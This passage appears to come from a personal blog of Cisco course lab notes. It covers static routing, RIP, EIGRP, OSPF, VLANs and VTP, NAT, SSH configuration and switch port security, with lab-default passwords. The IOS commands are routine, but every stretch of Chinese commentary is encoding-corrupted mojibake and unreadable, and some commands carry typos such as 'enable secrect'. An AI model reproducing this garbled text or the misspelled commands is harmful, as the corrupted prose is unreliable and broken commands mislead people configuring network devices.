class="hljs-number">255.255.255.192</span> <span class="hljs-number">172.31.1.194</span><br>ip route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.194</span><br><span class="hljs-literal">no</span> ip route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.198</span><br></code></pre></td></tr></table></figure><p>R3</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.197</span><br></code></pre></td></tr></table></figure><h2 id="lab-3-amp-3-10"><a href="#lab-3-amp-3-10" class="headerlink" title="lab 3&amp;3/10"></a>lab 3&amp;3/10</h2><blockquote><p><strong>The Enable Password</strong></p><p>The <em>enable password</em> controls access to privilege mode. This is a VERY important password because in privilege mode you can make configuration changes.</p><p>Krang(config)#enable password frodo</p><p>You can securely encrypt the <em>enable password</em>, by using the enable secret command.</p><p>Krang(config)#enable secret hobbits</p><p>If you have both passwords, the enable secret is the password used.</p></blockquote><p>enable secret password å‚¨å­˜åŠ å¯†çš„å¯†ç ï¼Œä¼šè¦†ç›–enable password frodo</p><hr><p>åœ¨ç«¯å£ä¸Šå¯ç”¨cdp runï¼Œæœ¬æœºè·¯ç”±å™¨show cdp nei çœ‹ä¸è§</p><p>è€Œåœ¨åˆ«çš„è·¯ç”±ä¸Šå¯ä»¥çœ‹è§</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200310104354035.png" class="" title="image-20200310104354035"><p>å¦‚å³è¾¹è·¯ç”±f0/0 åªåœ¨ç«¯å£ä¸Šcdp runã€‚å·¦è¾¹ç«¯å£å’Œè·¯ç”±éƒ½cdp runäº†ã€‚å·¦è¾¹show cdp neièƒ½çœ‹è§å³è¾¹çš„ç«¯å£ï¼Œå³è¾¹show cdp nei çœ‹ä¸è§ä»»ä½•è®°å½•</p><h2 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">(config-<span class="hljs-keyword">if</span>)description FastEthernet <span class="hljs-keyword">interface</span> <span class="hljs-symbol">on</span> <span class="hljs-symbol">Router</span> <span class="hljs-symbol">1</span><br></code></pre></td></tr></table></figure><h2 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">clear arp<br></code></pre></td></tr></table></figure><h2 id="Lab-6"><a href="#Lab-6" class="headerlink" title="Lab 6"></a>Lab 6</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">(<span class="hljs-built_in">config</span>)<span class="hljs-comment">#ip host California 195.42.36.10</span><br><span class="hljs-keyword">show </span>hosts<br></code></pre></td></tr></table></figure><h2 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h2><ul><li>Add RIP routing protocol to the router. What command does this?</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#router</span> rip<br><br><span class="hljs-function"><span class="hljs-title">Router2</span><span class="hljs-params">(config-router)</span></span>#<br></code></pre></td></tr></table></figure><ul><li>Add the network(s) that Router 2 is directly connected to. What statements will do this?</li></ul><p><code>Router2(config-router)#network 10.0.0.0</code></p><blockquote><p>æŸ¥çœ‹æ›´æ–°ä¿¡æ¯ä½¿ç”¨ debug ip rip å‘½ä»¤æ—¶ï¼Œè¦ç”¨ terminal monitor å‘½ä»¤æ¥æ¥æ”¶debug å‘½ä»¤äº§ç”Ÿçš„è¾“å‡ºã€‚debug ip rip ä¼šæŠŠæ›´æ–°ä¿¡æ¯å‘é€ç»™æ§åˆ¶å°ä¼šè¯ã€‚</p><p>Router#debug ip rip</p><p>RIP protocol debugging is on</p><p>Router#terminal monitor</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¾“å‡ºçš„æ›´æ–°ä¿¡æ¯ï¼Œä½†æ˜¯å®ƒä¼šä¸æ–­çš„å‡ºæ¥ï¼Œæ‰€ä»¥è¦åœæ­¢å®ƒå°±å¾—è¾“å…¥ un all æˆ– undebug all æˆ– no debug ip rip å³å¯åœæ­¢ä¿¡æ¯çš„è¾“å‡º</p><p>Router#un all</p><p><a href="http://blog.sina.com.cn/s/blog_62fd2bcb0102voc0.html">åŸæ–‡</a></p></blockquote><h2 id="3-17-amp-Lab-9"><a href="#3-17-amp-Lab-9" class="headerlink" title="3.17&amp;Lab 9"></a>3.17&amp;Lab 9</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200317102740553.png" class="" title="image-20200317102740553"><p>è·¯ç”±å™¨è¿æ¥åˆ°serverï¼Œå¹¶ä¸”serverå¼€å¯tftpæ—¶å€™</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Tampa<span class="hljs-comment"># copy running-config tftp</span><br><span class="hljs-keyword">Address </span><span class="hljs-keyword">or </span>name of remote host []?<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br>å‚¨å­˜çš„æ–‡ä»¶åï¼šTampa_config<br></code></pre></td></tr></table></figure><h2 id="Lab10å¾…è¡¥-ä¸ç†Ÿï¼ï¼ï¼"><a href="#Lab10å¾…è¡¥-ä¸ç†Ÿï¼ï¼ï¼" class="headerlink" title="Lab10å¾…è¡¥-ä¸ç†Ÿï¼ï¼ï¼"></a>Lab10å¾…è¡¥-ä¸ç†Ÿï¼ï¼ï¼</h2><h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><p>*<em>äº¤æ¢æœºä¹‹é—´çš„çº¿ç”¨copper cross-over *</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sw1</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">2</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">3</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><br><span class="hljs-attribute">sw2</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">2</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">3</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><br><span class="hljs-attribute">router</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">encapsulation</span> dot<span class="hljs-number">1</span>Q <span class="hljs-number">2</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">192.168.1.254</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">no</span> shut<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">encapsulation</span> dot<span class="hljs-number">1</span>Q <span class="hljs-number">3</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">192.168.2.254</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">no</span> shut<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span> shut<br></code></pre></td></tr></table></figure><p><strong>VTP</strong></p><p> VLAN ä¸­ç»§åè®® (VTP) çš„ä¿¡æ¯ã€‚VTP å¯ç®€åŒ–äº¤æ¢ç½‘ç»œä¸­çš„ç®¡ç†ã€‚åœ¨ä¸€å° VTP æœåŠ¡å™¨ä¸Šé…ç½®æ–°çš„ VLAN æ—¶ï¼Œè¯¥ VLAN å°†é€šè¿‡åŸŸä¸­çš„æ‰€æœ‰äº¤æ¢æœºè¿›è¡Œåˆ†å‘ã€‚è¿™æ ·å¯ä»¥å‡å°‘åœ¨å„å¤„é…ç½®ç›¸åŒ VLAN çš„éœ€æ±‚ã€‚VTP æ˜¯ä¸€ç§ Cisco ä¸“æœ‰åè®®</p><p><a href="https://www.cisco.com/c/en/us/support/docs/lan-switching/vtp/10558-21.html">å®˜æ–¹è§£é‡Š</a></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200319213900208.png" class="" title="image-20200319213900208"><p><strong>3</strong>. åœ¨switch1åˆé€‚çš„é…ç½®æ¨¡å¼ä¸‹è®¾ç½®å¦‚ä¸‹å‘½ä»¤ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vtp mode server<br>vtp domain cisco<br>vlan 10<br>vlan 100<br></code></pre></td></tr></table></figure><p> åœ¨switch2åˆé€‚çš„é…ç½®æ¨¡å¼ä¸‹è®¾ç½®å¦‚ä¸‹å‘½ä»¤ã€‚</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">vtp <span class="hljs-keyword">client</span><br>vtp domain cisco<br></code></pre></td></tr></table></figure><h2 id="Lab-14"><a href="#Lab-14" class="headerlink" title="Lab 14"></a>Lab 14</h2><p>EIGRP</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Router(<span class="hljs-params">config</span>)</span>#router eigrp ?<br>  &lt;<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>&gt;  Autonomous system number<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">router</span>)</span>#network <span class="hljs-number">12.1</span>.<span class="hljs-number">1.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">router</span>)</span>#network <span class="hljs-number">2.2</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span>ã€€ï¼ˆæ­£/åæ©ç çš†å¯ï¼‰<br></code></pre></td></tr></table></figure><p>RIP</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#router</span> rip<br>version <span class="hljs-number">2</span><br>network <span class="hljs-number">120.10</span>.<span class="hljs-number">10.0</span><br></code></pre></td></tr></table></figure><p>OSPF</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Router(config)#router<span class="hljs-built_in"> ospf </span>?<br>  &lt;1-65535&gt;  Process ID<br>network 120.10.10.0 0.0.0.252<span class="hljs-built_in"> area </span>?<br> <span class="hljs-built_in"> area </span> <span class="hljs-builtin-name">Set</span> the<span class="hljs-built_in"> OSPF area </span>ID<br></code></pre></td></tr></table></figure><h2 id="lab-15"><a href="#lab-15" class="headerlink" title="lab 15"></a>lab 15</h2><p>NAT,è¯¦è§<a href="https://blog.csdn.net/besti_white/article/details/81430894">link</a></p><p>ç«¯å£å¤šè·¯å¤ç”¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Access</span>-list <span class="hljs-number">12</span> permit <span class="hljs-number">192.168.101.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">ip</span> nat inside source list <span class="hljs-number">12</span> interface serial <span class="hljs-number">1</span>/<span class="hljs-number">0</span> overload<br></code></pre></td></tr></table></figure><p>NAT pool</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">interface</span> loopback <span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.200.1</span> <span class="hljs-number">255.255.255.0</span><br>!<br>ip nat pool goodpool <span class="hljs-number">192.168.200.2</span> <span class="hljs-number">192.168.200.101</span> netmask <span class="hljs-number">255.255.255.0</span><br>access-list <span class="hljs-number">10</span> permit <span class="hljs-number">192.168.101.0</span> <span class="hljs-number">0.0.0.255</span><br>ip nat inside source list <span class="hljs-number">10</span> pool goodpool<br><br></code></pre></td></tr></table></figure><h2 id="Lab-16"><a href="#Lab-16" class="headerlink" title="Lab 16"></a>Lab 16</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">fastethernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">11</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">trunk</span><br><br><br><span class="hljs-symbol">interface</span> <span class="hljs-symbol">fastethernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">11</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">dynamic</span> <span class="hljs-symbol">desirable</span><br></code></pre></td></tr></table></figure><h2 id="3-26"><a href="#3-26" class="headerlink" title="3/26"></a>3/26</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091535593.png" class="" title="image-20200326091535593"><h2 id="3-31"><a href="#3-31" class="headerlink" title="3/31"></a>3/31</h2><h3 id="RIPv2è‡ªåŠ¨æ±‡æ€»"><a href="#RIPv2è‡ªåŠ¨æ±‡æ€»" class="headerlink" title="RIPv2è‡ªåŠ¨æ±‡æ€»"></a>RIPv2è‡ªåŠ¨æ±‡æ€»</h3><p>ä½¿ç”¨ <strong>no auto-summary</strong> è·¯ç”±å™¨é…ç½®æ¨¡å¼å‘½ä»¤ï¼Œä¿®æ”¹é»˜è®¤ RIPv2 è‡ªåŠ¨æ±‡æ€»è¡Œä¸ºã€‚å½“ä½¿ç”¨ RIPv1 æ—¶ï¼Œæ­¤å‘½ä»¤æ— æ•ˆã€‚å½“å·²ç¦ç”¨è‡ªåŠ¨æ±‡æ€»æ—¶ï¼ŒRIPv2 ä¸ä¼šå†å°†ç½‘ç»œæ±‡æ€»åˆ°å…¶åœ¨è¾¹ç•Œè·¯ç”±å™¨ä¸Šçš„æœ‰ç±»åœ°å€ã€‚</p><h3 id="é…ç½®è¢«åŠ¨æ¥å£"><a href="#é…ç½®è¢«åŠ¨æ¥å£" class="headerlink" title="é…ç½®è¢«åŠ¨æ¥å£"></a>é…ç½®è¢«åŠ¨æ¥å£</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå°† RIP æ›´æ–°ä»æ‰€æœ‰å¯ç”¨ RIP çš„æ¥å£å‘å‡ºã€‚ä½¿ç”¨ <strong>passive-interface</strong> è·¯ç”±å™¨é…ç½®å‘½ä»¤é˜»æ­¢é€šè¿‡è·¯ç”±å™¨æ¥å£ä¼ è¾“è·¯ç”±æ›´æ–°ï¼Œä½†æ˜¯ä»ç„¶å…è®¸å°†è¯¥ç½‘ç»œé€šå‘Šè‡³å…¶ä»–è·¯ç”±å™¨ã€‚è¯¥å‘½ä»¤ä¼šåœæ­¢æŒ‡å®šæ¥å£çš„è·¯ç”±æ›´æ–°ã€‚ä½†æ˜¯ï¼Œä»å…¶ä»–æ¥å£å‘å‡ºçš„è·¯ç”±æ›´æ–°ä¸­ä»é€šå‘ŠæŒ‡å®šæ¥å£æ‰€å±çš„ç½‘ç»œã€‚å¯ä»¥ä½¿ç”¨ <strong>passive-interface default</strong> å‘½ä»¤å°†æ‰€æœ‰æ¥å£è®¾ä¸ºè¢«åŠ¨ã€‚ä¸èƒ½è®¾ä¸ºè¢«åŠ¨çš„æ¥å£å¯ä»¥ä½¿ç”¨ <strong>no passive-interface</strong> å‘½ä»¤é‡æ–°å¯ç”¨ã€‚</p><blockquote><p>router rip</p><p>passive-interface g0/0</p><p>end</p></blockquote><blockquote><p>ä¼ æ’­é»˜è®¤è·¯ç”±</p><p>è¾¹ç¼˜è·¯ç”±å™¨å¿…é¡»é…ç½®ï¼š</p><ul><li><p>ä½¿ç”¨ <strong>ip route 0.0.0.0 0.0.0.0</strong> next_ip å‘½ä»¤çš„é»˜è®¤é™æ€è·¯ç”±ã€‚</p></li><li><p><strong>default-information originate</strong> è·¯ç”±å™¨é…ç½®å‘½ä»¤ã€‚è¿™ä¼šæŒ‡å¯¼ R1 é€šè¿‡åœ¨ RIP æ›´æ–°ä¸­ä¼ æ’­é™æ€é»˜è®¤è·¯ç”±æ¥äº§ç”Ÿé»˜è®¤ä¿¡æ¯ã€‚</p></li></ul><p>åœ¨ä¸€ä¸ªå•å‡ºå£ç½‘ç»œå†…å¯ç”¨RIPåè®®ï¼Œåœ¨ç½‘ç»œå‡ºå£å¤„çš„è·¯ç”±å™¨éœ€è¦å‘RIPåŸŸå†…ä¼ æ’­ä¸€æ¡é»˜è®¤è·¯ç”±ï¼Œè¿™æ ·ï¼ŒåŸŸå†…çš„è·¯ç”±å™¨å°±å¯ä»¥é€šè¿‡é»˜è®¤è·¯ç”±è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚ä¸‹é¢æˆ‘ä»¬å°±ç”¨è¯•éªŒæ¥æ¨¡æ‹Ÿè¿™ä¸ªç¯å¢ƒã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼›é€šè¿‡RIPä¼ é€’é»˜è®¤è·¯ç”±å…±æœ‰5ç§æ–¹æ³•ã€‚<br>1 default-information<br>2 æ‰‹å·¥å†™ä¸€æ¡é»˜è®¤è·¯ç”±ï¼ˆåˆ°NULL0ï¼‰ ç„¶åé‡åˆ†å¸ƒåˆ°RIPä¸­<br>3 æ‰‹å·¥å†™ä¸€æ¡é»˜è®¤è·¯ç”±ï¼ˆåˆ°NULL0ï¼‰åœ¨è¿›ç¨‹ä¸­å®£å‘Š<br>4 ip default-network<br>5åœ¨æ¥å£æ±‡æ€»0.0.0.0/0åˆ°NULL0çš„è·¯ç”±</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200331115232904.png" class="" title="image-20200331115232904"><h2 id="3-2-1-8-Troubleshooting-Static-Routes"><a href="#3-2-1-8-Troubleshooting-Static-Routes" class="headerlink" title="3.2.1.8 Troubleshooting Static Routes"></a>3.2.1.8 Troubleshooting Static Routes</h2><p>RIPé…ç½®çš„æ—¶å€™å®£å‘Šè‡ªå·±æ‰€åœ¨çš„ç½‘æ®µå³å¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">R1</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">default</span>-information originate # é€šå‘Šé…ç½®çš„é»˜è®¤è·¯ç”±<br><br><span class="hljs-attribute">R2</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.3.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.4.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><br><span class="hljs-attribute">R3</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.4.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.5.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="4-14-amp-5-2-1-4-Configuring-SSH"><a href="#4-14-amp-5-2-1-4-Configuring-SSH" class="headerlink" title="4/14&amp;5.2.1.4  Configuring SSH !!!!"></a>4/14&amp;5.2.1.4  Configuring SSH !!!!</h2><p>==ç”Ÿæˆæ ‘åè®®å­¦ä¹ ä¸€ä¸‹==</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105142666.png" class="" title="image-20200414105142666"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105353212.png" class="" title="image-20200414105353212"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105430248.png" class="" title="image-20200414105430248"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415115335471.png" class="" title="image-20200415115335471"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">copy running-config start<br>service password-encryption<br><br>ip domain-name netacad.pka<br>crypto key generate rsa<br><span class="hljs-number">1024</span><br>username administrator secret cisco<br>line vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br>transport input ssh<br>login local <br>no password <span class="hljs-comment">#åˆ é™¤å¯†ç </span><br><span class="hljs-keyword">exit</span><br>ip ssh version <span class="hljs-number">2</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h2 id="5-2-2-7-Configuring-Switch-Port-Security"><a href="#5-2-2-7-Configuring-Switch-Port-Security" class="headerlink" title="5.2.2.7  Configuring Switch Port Security !!!!"></a>5.2.2.7  Configuring Switch Port Security !!!!</h2><p>ç«¯å£å®‰å…¨è¿è§„çš„é»˜è®¤æ¨¡å¼ä¸ºå…³é—­ç«¯å£</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-built_in">int</span> f0/<span class="hljs-number">0</span><br>switchport mode access <span class="hljs-comment"># è®¾ä¸ºæ¥å…¥</span><br>switchport port-security <span class="hljs-comment"># å¯ç”¨åŠ¨æ€ç«¯å£å®‰å…¨</span><br>switchport port-security maximum <span class="hljs-number">10</span> <span class="hljs-comment"># è®¾ç½®ç«¯å£å…è®¸å®‰å…¨åœ°å€çš„æœ€å¤§æ•°é‡</span><br>switchport port-security mac-address sticky <span class="hljs-comment">#å¯ç”¨ç²˜æ€§è·å–ï¼Œä¿æŠ¤ç«¯å£å®‰å…¨ï¼Œä»¥ä¾¿åŠ¨æ€è·å–è®¾å¤‡çš„ MAC åœ°å€å¹¶å°†å…¶æ·»åŠ åˆ°è¿è¡Œé…ç½®</span><br>switchport port-security violation restrict <span class="hljs-comment">#ä¿æŠ¤æ¥å£ï¼Œä½¿å…¶åœ¨å‡ºç°è¿è§„æ—¶å‘å‡ºé€šçŸ¥ï¼Œä½†ä¸ç¦ç”¨ç«¯å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-built_in">range</span> fastEthernet0/<span class="hljs-number">3</span> - <span class="hljs-number">24</span> <span class="hljs-comment"># ä»3åˆ°24ç«¯å£å…¨éƒ¨å…³é—­</span><br><br></code></pre></td></tr></table></figure><p>å®‰å…¨è¿è§„æ¨¡å¼-Protect\Restrict\Shutdown</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415123202415.png" class="" title="image-20200415123202415"><h2 id="5-3-1-2-Skills-Integration-Challenge"><a href="#5-3-1-2-Skills-Integration-Challenge" class="headerlink" title="5.3.1.2 Skills Integration Challenge"></a>5.3.1.2 Skills Integration Challenge</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">host S1<br>line console <span class="hljs-number">0</span><br>password cisco<br>login <br><span class="hljs-keyword">exit</span><br>enable secrect class<br>service password-encryption<br><br>int vlan1<br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>no shut<br><br>ip domain-name cisco.com<br>crypto key generate rsa<br><span class="hljs-number">1024</span><br>username admin secret ccna<br>line vty <span class="hljs-number">0</span> <span 